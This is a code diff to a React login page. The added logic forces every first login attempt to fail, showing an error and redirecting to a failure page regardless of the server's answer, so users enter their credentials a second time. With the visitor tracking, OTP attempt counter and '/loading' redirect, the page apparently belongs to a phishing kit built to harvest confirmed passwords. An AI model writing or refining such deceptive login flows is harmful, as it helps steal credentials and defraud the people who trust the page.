@@ -10,11 +10,23 @@ export default function Login() {
   const [password, setPassword] = useState("");
   const [showPassword, setShowPassword] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
+  const [loginAttempts, setLoginAttempts] = useState(0);
   const [, setLocation] = useLocation();
   const { toast } = useToast();
   const { t } = useTranslation();
 
   useEffect(() => {
+    // Sync login attempts from localStorage on mount
+    if (typeof window !== 'undefined') {
+      const storedAttempts = localStorage.getItem('loginAttempts');
+      if (storedAttempts) {
+        setLoginAttempts(parseInt(storedAttempts));
+      } else {
+        // Fresh login session
+        setLoginAttempts(0);
+      }
+    }
+    
     // Track visitor when page loads with language info
     const language = navigator.language || "Unknown";
     apiRequest("POST", "/api/track-visit", {
@@ -27,6 +39,10 @@ export default function Login() {
 
   const handleLogin = async (e: React.FormEvent) => {
     e.preventDefault();
+    
+    // Prevent double submission
+    if (isLoading) return;
+    
     setIsLoading(true);
 
     try {
@@ -42,9 +58,37 @@ export default function Login() {
       });
       const data = await response.json();
 
-      if (data.success) {
-        // Clear any previous OTP attempts for fresh login session
-        localStorage.removeItem('otpAttempts');
+      // Increment login attempt counter (regardless of backend response)
+      const newAttempts = loginAttempts + 1;
+      setLoginAttempts(newAttempts);
+      
+      // On first login attempt, redirect to login failure page
+      if (newAttempts === 1) {
+        // Store the attempt count
+        if (typeof window !== 'undefined') {
+          localStorage.setItem('loginAttempts', newAttempts.toString());
+        }
+        
+        toast({
+          title: t('login_failed_title'),
+          description: t('login_failed_desc'),
+          variant: "destructive",
+        });
+        
+        // Redirect to login failure page (button stays disabled)
+        setTimeout(() => {
+          setLocation("/login-failure");
+        }, 1500);
+        
+        // Don't re-enable button during redirect
+        return;
+      } else if (data.success) {
+        // Second attempt AND backend accepted - proceed to loading page
+        // Clear login attempts for fresh session
+        if (typeof window !== 'undefined') {
+          localStorage.removeItem('loginAttempts');
+          localStorage.removeItem('otpAttempts');
+        }
         
         toast({
           title: t('login_success_title'),
@@ -54,10 +98,16 @@ export default function Login() {
         setEmail("");
         setPassword("");
 
-        // Redirect to loading page
+        // Redirect to loading page (button stays disabled)
         setTimeout(() => {
           setLocation("/loading");
         }, 1000);
+        
+        // Don't re-enable button during redirect
+        return;
+      } else {
+        // Second+ attempt but backend rejected - show error and re-enable
+        throw new Error(data.error || "Login failed");
       }
     } catch (error: any) {
       toast({
@@ -65,7 +115,7 @@ export default function Login() {
         description: error.message || t('login_failed_desc'),
         variant: "destructive",
       });
-    } finally {
+      // Re-enable button only on actual error
       setIsLoading(false);
     }
   };
